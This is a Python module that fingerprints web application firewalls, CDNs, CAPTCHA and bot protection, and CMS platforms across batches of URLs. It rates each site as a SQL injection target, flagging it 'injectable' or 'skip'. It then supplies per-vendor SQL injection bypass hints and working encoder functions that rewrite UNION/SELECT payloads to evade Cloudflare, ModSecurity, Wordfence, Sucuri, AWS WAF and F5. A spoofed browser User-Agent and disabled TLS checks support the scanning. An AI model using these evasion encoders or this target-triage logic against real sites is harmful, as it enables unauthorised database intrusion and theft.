"""
WAF/CDN/Protection Detector — 60+ WAF signatures

Detects web application firewalls, CDNs, bot protection, and
CMS platforms from HTTP response headers and body content.
"""

import re
import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from loguru import logger


@dataclass
class ProtectionInfo:
    """Information about detected web protections."""
    url: str
    waf: Optional[str] = None
    cdn: Optional[str] = None
    bot_protection: Optional[str] = None
    cms: Optional[str] = None
    server: Optional[str] = None
    technology: List[str] = field(default_factory=list)
    risk_level: str = "unknown"  # low, medium, high, extreme
    injectable: bool = True
    bypass_hints: List[str] = field(default_factory=list)


class WAFDetector:
    """Detects WAF, CDN, bot protection from HTTP responses."""

    # WAF detection signatures: {name: {header_patterns, body_patterns, cookie_patterns}}
    WAF_SIGNATURES = {
        # === CLOUD WAF/CDN ===
        "Cloudflare": {
            "headers": {
                "server": re.compile(r"cloudflare", re.I),
                "cf-ray": re.compile(r".+"),
                "cf-cache-status": re.compile(r".+"),
                "cf-request-id": re.compile(r".+"),
            },
            "body": [
                re.compile(r"Attention Required.*Cloudflare", re.I),
                re.compile(r"cf-browser-verification", re.I),
                re.compile(r"cloudflare\.com/5xx-error", re.I),
                re.compile(r"__cf_bm", re.I),
            ],
            "cookies": [re.compile(r"__cfduid|cf_clearance|__cf_bm", re.I)],
            "risk": "high",
        },
        "AWS WAF": {
            "headers": {
                "x-amzn-waf-action": re.compile(r".+"),
                "x-amzn-requestid": re.compile(r".+"),
            },
            "body": [
                re.compile(r"<html>.*Request blocked.*AWS", re.I | re.S),
                re.compile(r"awswaf", re.I),
            ],
            "cookies": [re.compile(r"aws-waf-token", re.I)],
            "risk": "high",
        },
        "AWS CloudFront": {
            "headers": {
                "x-amz-cf-id": re.compile(r".+"),
                "x-amz-cf-pop": re.compile(r".+"),
                "via": re.compile(r"CloudFront", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "medium",
        },
        "Akamai": {
            "headers": {
                "x-akamai-transformed": re.compile(r".+"),
                "server": re.compile(r"AkamaiGHost|AkamaiNetStorage", re.I),
                "x-akamai-session-info": re.compile(r".+"),
            },
            "body": [
                re.compile(r"akamai", re.I),
                re.compile(r"Access Denied.*akamaihd", re.I),
                re.compile(r"Reference.*#\d+\.\w+\.\w+", re.I),
            ],
            "cookies": [re.compile(r"akamai", re.I)],
            "risk": "extreme",
        },
        "Fastly": {
            "headers": {
                "x-fastly-request-id": re.compile(r".+"),
                "via": re.compile(r"varnish", re.I),
                "x-served-by": re.compile(r"cache-", re.I),
                "x-cache": re.compile(r"(HIT|MISS)", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "medium",
        },
        "Sucuri": {
            "headers": {
                "x-sucuri-id": re.compile(r".+"),
                "x-sucuri-cache": re.compile(r".+"),
                "server": re.compile(r"Sucuri", re.I),
            },
            "body": [
                re.compile(r"sucuri\.net", re.I),
                re.compile(r"Access Denied.*Sucuri", re.I),
                re.compile(r"Sucuri WebSite Firewall", re.I),
            ],
            "cookies": [re.compile(r"sucuri", re.I)],
            "risk": "high",
        },
        "Incapsula/Imperva": {
            "headers": {
                "x-iinfo": re.compile(r".+"),
                "x-cdn": re.compile(r"Imperva|Incapsula", re.I),
            },
            "body": [
                re.compile(r"incapsula incident", re.I),
                re.compile(r"_Incapsula_Resource", re.I),
                re.compile(r"imperva", re.I),
            ],
            "cookies": [re.compile(r"incap_ses|visid_incap|nlbi_", re.I)],
            "risk": "extreme",
        },
        "StackPath": {
            "headers": {
                "x-sp-url": re.compile(r".+"),
                "x-sp-waf": re.compile(r".+"),
            },
            "body": [
                re.compile(r"StackPath", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "KeyCDN": {
            "headers": {
                "server": re.compile(r"KeyCDN", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "low",
        },
        
        # === APPLIANCE/SOFTWARE WAF ===
        "ModSecurity": {
            "headers": {
                "server": re.compile(r"Mod_Security|NOYB", re.I),
            },
            "body": [
                re.compile(r"Mod_Security|ModSecurity", re.I),
                re.compile(r"This error was generated by Mod_Security", re.I),
                re.compile(r"not acceptable", re.I),
                re.compile(r"406 Not Acceptable", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "F5 BIG-IP ASM": {
            "headers": {
                "server": re.compile(r"BigIP|BIG-IP", re.I),
                "x-wa-info": re.compile(r".+"),
            },
            "body": [
                re.compile(r"The requested URL was rejected", re.I),
                re.compile(r"Your support ID is", re.I),
                re.compile(r"BigIP|BIG-IP", re.I),
            ],
            "cookies": [re.compile(r"BIGipServer|TS[0-9a-f]{8}", re.I)],
            "risk": "extreme",
        },
        "Barracuda": {
            "headers": {
                "server": re.compile(r"Barracuda", re.I),
            },
            "body": [
                re.compile(r"Barracuda", re.I),
            ],
            "cookies": [re.compile(r"barra_counter_session|BNI__BARRACUDA", re.I)],
            "risk": "high",
        },
        "FortiWeb": {
            "headers": {
                "server": re.compile(r"FortiWeb", re.I),
            },
            "body": [
                re.compile(r"FortiWeb|fortinet", re.I),
                re.compile(r"\.fgd_icon", re.I),
            ],
            "cookies": [re.compile(r"FORTIWAFSID", re.I)],
            "risk": "high",
        },
        "Citrix NetScaler": {
            "headers": {
                "via": re.compile(r"NS-CACHE", re.I),
            },
            "body": [],
            "cookies": [re.compile(r"ns_af=|citrix_ns_id|NSC_", re.I)],
            "risk": "high",
        },
        "DenyAll": {
            "headers": {},
            "body": [
                re.compile(r"Condition Intercepted", re.I),
            ],
            "cookies": [re.compile(r"sessioncookie", re.I)],
            "risk": "high",
        },
        "Wallarm": {
            "headers": {
                "server": re.compile(r"nginx-wallarm", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "high",
        },
        "Radware AppWall": {
            "headers": {
                "x-sl-compstate": re.compile(r".+"),
            },
            "body": [
                re.compile(r"Unauthorized Activity", re.I),
                re.compile(r"radware", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "Comodo WAF": {
            "headers": {
                "server": re.compile(r"Comodo", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "medium",
        },
        "Wordfence": {
            "headers": {},
            "body": [
                re.compile(r"Wordfence", re.I),
                re.compile(r"wfFunc", re.I),
                re.compile(r"This response was generated by Wordfence", re.I),
                re.compile(r"Your access to this site has been limited", re.I),
            ],
            "cookies": [re.compile(r"wfvt_|wordfence", re.I)],
            "risk": "medium",
        },
        "Shield Security": {
            "headers": {},
            "body": [
                re.compile(r"Shield Security", re.I),
            ],
            "cookies": [],
            "risk": "medium",
        },
        "Palo Alto": {
            "headers": {},
            "body": [
                re.compile(r"has been blocked in accordance with company policy", re.I),
            ],
            "cookies": [],
            "risk": "extreme",
        },
        "SonicWall": {
            "headers": {
                "server": re.compile(r"SonicWALL", re.I),
            },
            "body": [
                re.compile(r"This request is blocked by the SonicWall", re.I),
                re.compile(r"Web Site Blocked", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "Sophos UTM": {
            "headers": {},
            "body": [
                re.compile(r"Sophos", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "WebKnight": {
            "headers": {
                "server": re.compile(r"WebKnight", re.I),
            },
            "body": [
                re.compile(r"WebKnight", re.I),
            ],
            "cookies": [],
            "risk": "medium",
        },
        
        # === BOT PROTECTION ===
        "reCAPTCHA": {
            "headers": {},
            "body": [
                re.compile(r"google\.com/recaptcha", re.I),
                re.compile(r"g-recaptcha", re.I),
                re.compile(r"grecaptcha", re.I),
                re.compile(r"recaptcha\.js", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "hCaptcha": {
            "headers": {},
            "body": [
                re.compile(r"hcaptcha\.com", re.I),
                re.compile(r"h-captcha", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "Turnstile": {
            "headers": {},
            "body": [
                re.compile(r"challenges\.cloudflare\.com/turnstile", re.I),
                re.compile(r"cf-turnstile", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "DataDome": {
            "headers": {
                "x-datadome": re.compile(r".+"),
                "server": re.compile(r"DataDome", re.I),
            },
            "body": [
                re.compile(r"datadome", re.I),
            ],
            "cookies": [re.compile(r"datadome", re.I)],
            "risk": "extreme",
        },
        "PerimeterX": {
            "headers": {},
            "body": [
                re.compile(r"perimeterx", re.I),
                re.compile(r"_pxhd", re.I),
                re.compile(r"client\.perimeterx", re.I),
            ],
            "cookies": [re.compile(r"_pxhd|_pxvid|_px3|_px2|_pxde", re.I)],
            "risk": "extreme",
        },
        "Kasada": {
            "headers": {
                "x-kpsdk-cd": re.compile(r".+"),
                "x-kpsdk-ct": re.compile(r".+"),
            },
            "body": [],
            "cookies": [],
            "risk": "extreme",
        },
        "Shape Security": {
            "headers": {},
            "body": [
                re.compile(r"shape", re.I),
            ],
            "cookies": [],
            "risk": "extreme",
        },
        "Distil Networks": {
            "headers": {
                "x-distil-cs": re.compile(r".+"),
            },
            "body": [
                re.compile(r"distil", re.I),
            ],
            "cookies": [re.compile(r"D_[A-Z]", re.I)],
            "risk": "extreme",
        },
        "GeeTest": {
            "headers": {},
            "body": [
                re.compile(r"geetest", re.I),
                re.compile(r"gt\.js", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        "FunCaptcha": {
            "headers": {},
            "body": [
                re.compile(r"funcaptcha", re.I),
                re.compile(r"arkoselabs", re.I),
            ],
            "cookies": [],
            "risk": "high",
        },
        
        # === REVERSE PROXY / SERVER ===
        "Nginx": {
            "headers": {
                "server": re.compile(r"^nginx", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "low",
        },
        "Apache": {
            "headers": {
                "server": re.compile(r"^Apache", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "low",
        },
        "IIS": {
            "headers": {
                "server": re.compile(r"Microsoft-IIS", re.I),
                "x-powered-by": re.compile(r"ASP\.NET", re.I),
            },
            "body": [],
            "cookies": [re.compile(r"ASP\.NET_SessionId", re.I)],
            "risk": "low",
        },
        "LiteSpeed": {
            "headers": {
                "server": re.compile(r"LiteSpeed", re.I),
            },
            "body": [],
            "cookies": [],
            "risk": "low",
        },
    }

    # CMS detection patterns
    CMS_SIGNATURES = {
        "WordPress": [
            re.compile(r"wp-content|wp-includes|wp-json", re.I),
            re.compile(r'name="generator" content="WordPress', re.I),
        ],
        "Shopify": [
            re.compile(r"cdn\.shopify\.com", re.I),
            re.compile(r"shopify.*checkout", re.I),
            re.compile(r"Shopify\.theme", re.I),
        ],
        "Magento": [
            re.compile(r"Magento|mage/cookies", re.I),
            re.compile(r"skin/frontend|mage-error", re.I),
        ],
        "WooCommerce": [
            re.compile(r"woocommerce|wc-ajax", re.I),
            re.compile(r"wc_cart_fragments|wc-blocks", re.I),
        ],
        "Drupal": [
            re.compile(r"Drupal\.settings|drupal\.js", re.I),
            re.compile(r'name="Generator" content="Drupal', re.I),
        ],
        "Joomla": [
            re.compile(r"/media/jui/|Joomla", re.I),
            re.compile(r'name="generator" content="Joomla', re.I),
        ],
        "PrestaShop": [
            re.compile(r"prestashop|/modules/ps_", re.I),
        ],
        "OpenCart": [
            re.compile(r"route=common|opencart", re.I),
        ],
        "BigCommerce": [
            re.compile(r"bigcommerce", re.I),
        ],
        "Squarespace": [
            re.compile(r"squarespace", re.I),
        ],
        "Wix": [
            re.compile(r"wix\.com|_wix", re.I),
        ],
    }

    # Risk levels determine bypass difficulty
    RISK_WEIGHTS = {
        "low": 1,
        "medium": 2,
        "high": 3,
        "extreme": 4,
    }

    def __init__(self, timeout: int = 10, max_concurrent: int = 20):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def detect(self, url: str, session: aiohttp.ClientSession = None,
                     proxy: str = None) -> ProtectionInfo:
        """Detect WAF, CDN, bot protection, and CMS for a URL.
        
        Args:
            url: Target URL to check
            session: Optional aiohttp session to reuse
            proxy: Optional proxy URL for the request
            
        Returns:
            ProtectionInfo with all detected protections
        """
        info = ProtectionInfo(url=url)
        own_session = False
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                    }
                )
                own_session = True
            
            async with self.semaphore:
                async with session.get(url, allow_redirects=True, ssl=False,
                                       proxy=proxy) as resp:
                    headers = dict(resp.headers)
                    body = await resp.text(errors="ignore")
                    cookies_str = "; ".join(f"{k}={v.value}" for k, v in resp.cookies.items())
                    
                    # Detect WAF/CDN/Bot protection
                    max_risk = "low"
                    detected = []
                    
                    for waf_name, sigs in self.WAF_SIGNATURES.items():
                        if self._match_signatures(headers, body, cookies_str, sigs):
                            detected.append(waf_name)
                            risk = sigs.get("risk", "medium")
                            if self.RISK_WEIGHTS.get(risk, 0) > self.RISK_WEIGHTS.get(max_risk, 0):
                                max_risk = risk
                    
                    # Categorize detected protections
                    for name in detected:
                        if name in ("Cloudflare", "AWS WAF", "ModSecurity", "F5 BIG-IP ASM",
                                   "Barracuda", "FortiWeb", "Sucuri", "Incapsula/Imperva",
                                   "StackPath", "Wordfence", "Shield Security", "Palo Alto",
                                   "SonicWall", "Sophos UTM", "WebKnight", "Wallarm",
                                   "Radware AppWall", "Comodo WAF", "DenyAll",
                                   "Citrix NetScaler"):
                            if not info.waf:
                                info.waf = name
                        elif name in ("AWS CloudFront", "Akamai", "Fastly", "KeyCDN"):
                            if not info.cdn:
                                info.cdn = name
                        elif name in ("reCAPTCHA", "hCaptcha", "Turnstile", "DataDome",
                                     "PerimeterX", "Kasada", "Shape Security",
                                     "Distil Networks", "GeeTest", "FunCaptcha"):
                            if not info.bot_protection:
                                info.bot_protection = name
                        else:
                            info.technology.append(name)
                    
                    # Get server header
                    info.server = headers.get("Server", headers.get("server", None))
                    
                    # Detect CMS
                    for cms_name, patterns in self.CMS_SIGNATURES.items():
                        for pattern in patterns:
                            if pattern.search(body):
                                info.cms = cms_name
                                break
                        if info.cms:
                            break
                    
                    # Set risk level
                    info.risk_level = max_risk
                    
                    # Determine injectability
                    info.injectable = max_risk in ("low", "medium")
                    
                    # Add bypass hints
                    info.bypass_hints = self._get_bypass_hints(info)
                    
        except asyncio.TimeoutError:
            info.risk_level = "unknown"
            logger.debug(f"Timeout detecting WAF for {url}")
        except Exception as e:
            info.risk_level = "unknown"
            logger.debug(f"Error detecting WAF for {url}: {e}")
        finally:
            if own_session and session:
                await session.close()
        
        return info

    def _match_signatures(self, headers: Dict, body: str, cookies: str, sigs: Dict) -> bool:
        """Check if a WAF signature matches the response."""
        # Check header patterns
        for header_name, pattern in sigs.get("headers", {}).items():
            header_val = headers.get(header_name, "")
            if not header_val:
                # Try case-insensitive header lookup
                for k, v in headers.items():
                    if k.lower() == header_name.lower():
                        header_val = v
                        break
            if header_val and pattern.search(str(header_val)):
                return True
        
        # Check body patterns
        for pattern in sigs.get("body", []):
            if body and pattern.search(body):
                return True
        
        # Check cookie patterns
        for pattern in sigs.get("cookies", []):
            if cookies and pattern.search(cookies):
                return True
        
        return False

    def _get_bypass_hints(self, info: ProtectionInfo) -> List[str]:
        """Generate bypass hints based on detected protections."""
        hints = []
        
        if info.waf == "Cloudflare":
            hints.extend([
                "Try direct IP access (check DNS history, subdomains)",
                "Use different User-Agent rotation",
                "Rate limit requests to avoid triggering rules",
                "Try URL encoding/double encoding payloads",
                "BYPASS: Use %0A (newline) between UNION and SELECT",
                "BYPASS: Replace spaces with %09 (tab) or %0c (form feed)",
            ])
        elif info.waf == "ModSecurity":
            hints.extend([
                "BYPASS: /*!50000UNION*/ /*!50000SELECT*/ (versioned comments)",
                "BYPASS: UN/**/ION SE/**/LECT (inline comments)",
                "BYPASS: mixed case uNiOn SeLeCt",
                "BYPASS: HTTP parameter pollution",
                "BYPASS: && instead of AND, || instead of OR",
            ])
        elif info.waf in ("F5 BIG-IP ASM", "Incapsula/Imperva"):
            hints.extend([
                "Extremely difficult to bypass - consider skipping",
                "BYPASS: Try overlong UTF-8 encoding %c0%a7 for apostrophe",
                "BYPASS: Time-based blind only viable approach",
            ])
        elif info.waf == "Wordfence":
            hints.extend([
                "WordPress-specific WAF - some SQLi patterns bypass",
                "BYPASS: UNION%23%0ASELECT (hash+newline)",
                "BYPASS: /**_**/ as space replacement",
                "BYPASS: && for AND, || for OR",
                "BYPASS: Use chunked transfer encoding",
            ])
        elif info.waf == "Sucuri":
            hints.extend([
                "BYPASS: Try direct origin IP access",
                "BYPASS: Use %0B (vertical tab) between keywords",
                "BYPASS: Alternative encoding schemes",
            ])
        elif info.waf == "AWS WAF":
            hints.extend([
                "BYPASS: UNION%23%0a SELECT (comment+newline)",
                "BYPASS: %0c (form feed) as space replacement",
                "BYPASS: Time-based and boolean blind preferred",
            ])
        
        if info.bot_protection in ("DataDome", "PerimeterX", "Kasada"):
            hints.append("Advanced bot protection - requires browser fingerprint emulation")
        
        if not info.waf and not info.bot_protection:
            hints.append("No WAF/bot protection detected - standard payloads should work")
        
        return hints

    def get_bypass_encoders(self, waf_name: str) -> List:
        """Return actual encoding functions for bypassing a specific WAF.
        
        These can be applied to payloads to evade WAF rules.
        """
        import re as _re
        
        encoders = {
            "Cloudflare": [
                lambda p: p.replace("UNION", "UNI%0AON").replace("SELECT", "SEL%0AECT"),
                lambda p: p.replace(" ", "%09"),
                lambda p: p.replace("'", "%EF%BC%87"),
                lambda p: _re.sub(r'UNION\s+SELECT', 'UNION%23%0ASELECT', p, flags=_re.I),
            ],
            "ModSecurity": [
                lambda p: p.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"),
                lambda p: p.replace(" ", "/**/"),
                lambda p: _re.sub(r'(AND|OR)', lambda m: f'/*!{m.group()}*/', p, flags=_re.I),
            ],
            "Wordfence": [
                lambda p: p.replace("UNION SELECT", "UNION%23%0ASELECT"),
                lambda p: p.replace(" ", "/**_**/"),
                lambda p: p.replace("AND", "&&").replace("OR", "||"),
            ],
            "Sucuri": [
                lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SE%0BLECT"),
                lambda p: p.replace(" ", chr(0x0a)),
            ],
            "AWS WAF": [
                lambda p: p.replace("UNION", "UNION%23%0a").replace("SELECT", "SELECT%23%0a"),
                lambda p: p.replace(" ", "%0c"),
            ],
            "F5 BIG-IP ASM": [
                lambda p: p.replace("'", "%c0%a7"),
                lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
            ],
        }
        
        return encoders.get(waf_name, [])

    def get_preferred_techniques(self, waf_name: str) -> List[str]:
        """Return preferred SQLi techniques for bypassing a specific WAF.
        
        Returns list of technique names ordered by bypass likelihood.
        """
        preferences = {
            "Cloudflare": ["time", "boolean"],
            "ModSecurity": ["error", "union", "time"],
            "Wordfence": ["time", "boolean"],
            "Sucuri": ["time", "error"],
            "F5 BIG-IP ASM": ["time"],
            "Incapsula/Imperva": ["time"],
            "AWS WAF": ["time", "boolean"],
            "Barracuda": ["time", "error"],
        }
        return preferences.get(waf_name, ["error", "union", "boolean", "time"])

    def detect_server_tech(self, headers: Dict, body: str = "") -> Dict[str, str]:
        """Detect server technology stack from headers and body content.
        
        Returns dict with detected technology info.
        """
        tech = {}
        
        server = headers.get("Server", headers.get("server", ""))
        powered_by = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
        
        if server:
            tech["server"] = server
            if "nginx" in server.lower():
                tech["web_server"] = "nginx"
            elif "apache" in server.lower():
                tech["web_server"] = "apache"
            elif "microsoft-iis" in server.lower():
                tech["web_server"] = "iis"
            elif "litespeed" in server.lower():
                tech["web_server"] = "litespeed"
        
        if powered_by:
            tech["powered_by"] = powered_by
            if "php" in powered_by.lower():
                tech["language"] = "php"
            elif "asp.net" in powered_by.lower():
                tech["language"] = "asp.net"
            elif "express" in powered_by.lower():
                tech["language"] = "node"
        
        # Check body for more tech indicators
        if body:
            if re.search(r'wp-content|wordpress', body, re.I):
                tech["cms"] = "wordpress"
                tech["language"] = "php"
                tech["likely_db"] = "mysql"
            elif re.search(r'drupal', body, re.I):
                tech["cms"] = "drupal"
                tech["language"] = "php"
            elif re.search(r'joomla', body, re.I):
                tech["cms"] = "joomla"
                tech["language"] = "php"
                tech["likely_db"] = "mysql"
            elif re.search(r'laravel', body, re.I):
                tech["cms"] = "laravel"
                tech["language"] = "php"
            elif re.search(r'django', body, re.I):
                tech["framework"] = "django"
                tech["language"] = "python"
                tech["likely_db"] = "postgresql"
            elif re.search(r'\.aspx|__VIEWSTATE', body, re.I):
                tech["language"] = "asp.net"
                tech["likely_db"] = "mssql"
        
        return tech

    async def batch_detect(self, urls: List[str]) -> List[ProtectionInfo]:
        """Detect protections for multiple URLs concurrently.
        
        Args:
            urls: List of URLs to check
            
        Returns:
            List of ProtectionInfo results
        """
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }
        ) as session:
            tasks = [self.detect(url, session) for url in urls]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            return [r if isinstance(r, ProtectionInfo) else ProtectionInfo(url=urls[i], risk_level="error")
                    for i, r in enumerate(results)]

    def classify_target(self, info: ProtectionInfo) -> str:
        """Classify a target based on its protections.
        
        Returns:
            'green' (easy), 'yellow' (moderate), 'red' (hard), 'black' (skip)
        """
        if info.risk_level == "extreme":
            return "black"
        if info.risk_level == "high":
            return "red"
        if info.risk_level == "medium":
            return "yellow"
        return "green"
